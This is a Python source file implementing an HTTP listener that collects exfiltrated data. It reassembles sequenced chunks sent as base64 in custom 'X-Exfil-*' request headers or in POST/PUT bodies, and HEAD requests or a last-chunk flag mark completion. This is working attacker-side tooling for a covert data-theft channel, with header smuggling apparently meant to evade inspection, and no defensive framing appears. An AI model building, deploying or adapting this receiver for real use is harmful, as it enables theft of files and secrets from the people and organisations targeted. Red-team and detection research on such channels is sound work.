from __future__ import annotations
from typing import Iterator, Tuple
import threading, queue, time
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

class _Store:
    def __init__(self) -> None:
        self.queues: dict[str, "queue.PriorityQueue[Tuple[int, bytes]]"] = {}
        self.done: dict[str, bool] = {}
        self.lock = threading.Lock()

    def push(self, exfil_id: str, seq: int, data: bytes) -> None:
        with self.lock:
            if exfil_id not in self.queues:
                self.queues[exfil_id] = queue.PriorityQueue()
                self.done[exfil_id] = False
            self.queues[exfil_id].put((seq, data))

    def mark_done(self, exfil_id: str) -> None:
        with self.lock:
            self.done[exfil_id] = True

    def is_done(self, exfil_id: str) -> bool:
        with self.lock:
            return self.done.get(exfil_id, False)

    def pop_iter(self, exfil_id: str) -> Iterator[bytes]:
        buf_seq = 0
        buffer: dict[int, bytes] = {}
        pq = None
        while True:
            with self.lock:
                pq = self.queues.get(exfil_id)
            if pq is None:
                time.sleep(0.05); continue
            try:
                while True:
                    seq, data = pq.get(timeout=0.5)
                    buffer[seq] = data
                    if self.is_done(exfil_id) and pq.empty():
                        break
            except Exception:
                pass
            while buf_seq in buffer:
                yield buffer.pop(buf_seq)
                buf_seq += 1
            if self.is_done(exfil_id) and not buffer and pq.empty():
                break

def _make_handler_headers(store: _Store, path: str):
    class H(BaseHTTPRequestHandler):
        def do_POST(self):
            if self.path != path:
                self.send_response(404); self.end_headers(); return
            exfil_id = self.headers.get("X-Exfil-Id") or "default"
            seq = int(self.headers.get("X-Exfil-Seq") or "0")
            last = self.headers.get("X-Exfil-Last") == "1"
            xdata = self.headers.get("X-Exfil-Data")
            data = b""
            if xdata:
                import base64
                data = base64.b64decode(xdata)
            store.push(exfil_id, seq, data)
            if last:
                store.mark_done(exfil_id)
            self.send_response(200); self.end_headers()
    return H

def _make_handler_verbs(store: _Store, path: str):
    class H(BaseHTTPRequestHandler):
        def do_POST(self): self._handle("POST")
        def do_PUT(self): self._handle("PUT")
        def do_HEAD(self): self._handle("HEAD")
        def _handle(self, method: str):
            if self.path != path:
                self.send_response(404); self.end_headers(); return
            exfil_id = self.headers.get("X-Exfil-Id") or "default"
            seq = int(self.headers.get("X-Exfil-Seq") or "0")
            last = self.headers.get("X-Exfil-Last") == "1"
            if method in ("POST","PUT"):
                length = int(self.headers.get("Content-Length") or "0")
                data = self.rfile.read(length) if length > 0 else b""
                store.push(exfil_id, seq, data)
            if last or method == "HEAD":
                store.mark_done(exfil_id)
            self.send_response(200); self.end_headers()
    return H
